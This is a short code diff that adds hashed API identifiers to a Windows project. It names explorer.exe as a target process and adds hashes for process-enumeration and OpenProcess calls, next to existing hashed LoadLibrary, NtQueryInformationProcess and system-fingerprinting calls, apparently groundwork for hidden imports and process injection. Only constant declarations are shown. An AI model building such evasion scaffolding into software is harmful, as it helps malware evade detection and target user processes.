@@ -6,8 +6,16 @@ const ObjHash NTDLL_HASH = %MODHASH__ntdll.dll%;
 const ObjHash USER32_HASH = %MODHASH__user32.dll%;
 const ObjHash KERNEL32_HASH = %MODHASH__kernel32.dll%;
 
+const ObjHash TARGET_PROCESS_NAME_HASH = %FCTHASH__explorer.exe%;
+
 const ObjHash LOAD_LIBRARY_HASH = %FCTHASH__LoadLibraryA%;
 const ObjHash QUERY_INFORMATION_PROCESS_HASH = %FCTHASH__NtQueryInformationProcess%;
+const ObjHash PROC32_FIRST_HASH = %FCTHASH__Process32First%;
+const ObjHash PROC32_NEXT_HASH = %FCTHASH__Process32Next%;
+const ObjHash OPEN_PROCESS_HASH = %FCTHASH__OpenProcess%;
+const ObjHash CLOSE_HANDLE_HASH = %FCTHASH__CloseHandle%;
+const ObjHash CREATE_TOOLHELP32_SNAPSHOT_HASH = %FCTHASH__CreateToolhelp32Snapshot%;
+
 const ObjHash GET_COMPUTER_NAME_HASH = %FCTHASH__GetComputerNameA%;
 const ObjHash GET_DISK_FREE_SPACE_HASH = %FCTHASH__GetDiskFreeSpaceExA%;
 const ObjHash GET_SYSTEM_INFO_HASH = %FCTHASH__GetSystemInfo%;
